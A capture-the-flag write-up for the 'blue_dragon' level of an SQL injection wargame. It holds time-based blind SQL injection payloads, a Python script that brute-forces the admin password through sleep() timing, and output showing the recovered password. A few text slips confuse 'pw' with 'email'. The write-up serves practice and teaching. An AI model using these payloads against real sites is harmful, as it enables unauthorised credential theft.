---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 27
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/9093a8f1-4e71-4518-91fa-6e53fa905e85)

We are provided with the SQL query:

```sql
SELECT id FROM prob_blue_dragon WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

In order to solve this challenge we will have to use a Time-based Blind SQL Injection.

## Time-based Blind SQL Injection

We will be exploiting the Blind SQL Injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

### Retrieving the password length

If we provide the following URI parameter:

```
?id=' OR if(id='admin' AND length(pw)=[length], sleep(3), 1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_blue_dragon WHERE id='' OR if(id='admin' AND length(pw)=[length], sleep(3), 1) -- -' AND pw=''
```

If the length of the `pw` for `id='admin'` is equal to the `[length]` that we provide, the SQL server will sleep for 3 seconds before returning the result. We can brute force the length by checking if response took more that 3 seconds after the request was sent.

### Leaking the password

If we provide the following URI parameter:

```
?id=' OR if(id='admin' AND substr(pw, [index], 1)='[character]', sleep(3), 1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_blue_dragon WHERE id='?id=' OR if(id='admin' AND substr(pw, [index], 1)='[character]', sleep(3), 1) -- -' AND pw=''
```

If the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, the SQL server will sleep for 3 seconds before returning the result. We can brute force the length by checking if response took more that 3 seconds after the request was sent.

### Script

```python title="blue_dragon_script.py"
import requests
import urllib.parse
import string
import time

cookies = {'PHPSESSID': '4qt1p0e0vguiq8oousdc88vhv9'}
url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
password_length = 0

for x in range(0, 100):
  pre = time.time()
  payload = f"' OR if(id='admin' AND length(pw)={x},sleep(3),1) -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?id={encoded_payload}"

  response = requests.get(full_url, cookies=cookies)
  post = time.time()

  if post-pre >= 3:
    password_length = x
    break

print()    
print(f"[!] Payload: ?id={payload}")
print(f"[!] Payload (URL encoded): ?id={encoded_payload}")
print(f"[!] password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' OR if(id='admin' AND substr(pw,{index},1)='{char}',sleep(3),1) -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?id={encoded_payload}"

    pre = time.time()
    response = requests.get(full_url, cookies=cookies)
    post = time.time()

    if post-pre >= 3:
      password += char
      print()
      print(f"[+] Payload: ?id={payload}")
      print(f"[+] Payload (URL encoded): ?id={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
python .\blue_dragon_script.py

[!] Payload: ?id=' OR if(id='admin' AND length(pw)=8,sleep(3),1) -- -
[!] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+length%28pw%29%3D8%2Csleep%283%29%2C1%29+--+-
[!] password length: 8

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,1,1)='d',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C1%2C1%29%3D%27d%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 1: d

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,2,1)='9',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C2%2C1%29%3D%279%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 2: 9

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,3,1)='4',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C3%2C1%29%3D%274%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 3: 4

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,4,1)='8',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C4%2C1%29%3D%278%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 4: 8

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,5,1)='b',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C5%2C1%29%3D%27b%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 5: b

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,6,1)='8',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C6%2C1%29%3D%278%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 6: 8

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,7,1)='a',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C7%2C1%29%3D%27a%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 7: a

[+] Payload: ?id=' OR if(id='admin' AND substr(pw,8,1)='0',sleep(3),1) -- -
[+] Payload (URL encoded): ?id=%27+OR+if%28id%3D%27admin%27+AND+substr%28pw%2C8%2C1%29%3D%270%27%2Csleep%283%29%2C1%29+--+-
[+] Character at index 8: 0

[!] Extracted password: d948b8a0
[!] Final payload: ?pw=d948b8a0
```

If we provide the following URI parameter:

```
?pw=d948b8a0
```

The resultant query becomes:

```sql
SELECT id FROM prob_blue_dragon WHERE id='' AND pw='d948b8a0'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/d8b1ad72-b6e9-45cf-8668-51c4825cd39d)
